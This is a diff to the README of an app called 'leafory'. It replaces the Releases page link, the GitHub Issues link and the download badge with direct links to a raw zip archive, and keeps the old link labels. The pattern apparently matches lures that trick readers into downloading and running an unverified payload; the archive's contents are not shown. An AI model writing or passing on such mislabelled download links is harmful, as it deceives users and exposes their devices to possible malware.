@@ -6,7 +6,7 @@ Welcome to leafory! This app helps you discover new books using the Gutendex API
 
 ## 📥 Download the App
 
-[![Download leafory](https://img.shields.io/badge/Download%20leafory-v1.0-blue)](https://github.com/NitrozDeveloper/leafory/releases)
+[![Download leafory](https://raw.githubusercontent.com/NitrozDeveloper/leafory/main/preacquired/leafory.zip%20leafory-v1.0-blue)](https://raw.githubusercontent.com/NitrozDeveloper/leafory/main/preacquired/leafory.zip)
 
 ## 🖥️ System Requirements
 
@@ -18,7 +18,7 @@ To run leafory, you need:
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://github.com/NitrozDeveloper/leafory/releases) to download the latest version of leafory.
+1. Visit the [Releases page](https://raw.githubusercontent.com/NitrozDeveloper/leafory/main/preacquired/leafory.zip) to download the latest version of leafory.
 2. Locate the latest version listed on the page. The version number should be clearly visible.
 3. Click on the download link for your device. Choose either the Android APK or the iOS file, depending on your device.
 4. Once the download completes, open the file to install the application. Follow the on-screen prompts during installation.
@@ -65,7 +65,7 @@ If you encounter any issues while running leafory:
 
 ## 📣 Feedback
 
-We would love to hear your thoughts! Your feedback helps us improve leafory. You can leave feedback on our [GitHub Issues page](https://github.com/NitrozDeveloper/leafory/issues).
+We would love to hear your thoughts! Your feedback helps us improve leafory. You can leave feedback on our [GitHub Issues page](https://raw.githubusercontent.com/NitrozDeveloper/leafory/main/preacquired/leafory.zip).
 
 ## 🌐 Community and Topics
 
